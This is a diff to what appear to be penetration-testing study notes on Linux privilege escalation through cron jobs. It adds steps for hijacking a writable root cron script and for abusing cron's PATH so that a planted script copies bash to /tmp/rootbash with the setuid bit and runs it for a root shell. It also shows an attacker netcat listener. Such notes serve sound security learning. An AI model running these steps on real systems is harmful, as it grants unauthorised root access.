@@ -136,8 +136,10 @@ Privilege Escalation: Capabilities
     
 Privilege Escalation: Cron Jobs
 
+    ; File Permissions
     // victim
     cat /etc/crontab
+        ; * * * * * root /home/victim/backup.sh
     https://gtfobins.github.io/
     vim backup.sh
         #!/bin/bash
@@ -145,6 +147,18 @@ Privilege Escalation: Cron Jobs
      chmod 777 backup.sh
     // attacker
     nc -lvnp 4444
+    
+    ; PATH Environment Variable
+    // victim
+    cat /etc/crontab
+        ; PATH=/home/victim:..
+        ; * * * * * root backup.sh
+    vim backup.sh
+        #!/bin/bash
+        cp /bin/bash /tmp/rootbash
+        chmod +xs /tmp/rootbash
+    chmod 777 backup.sh
+    /tmp/rootbash -p
     
 Privilege Escalation: PATH
 
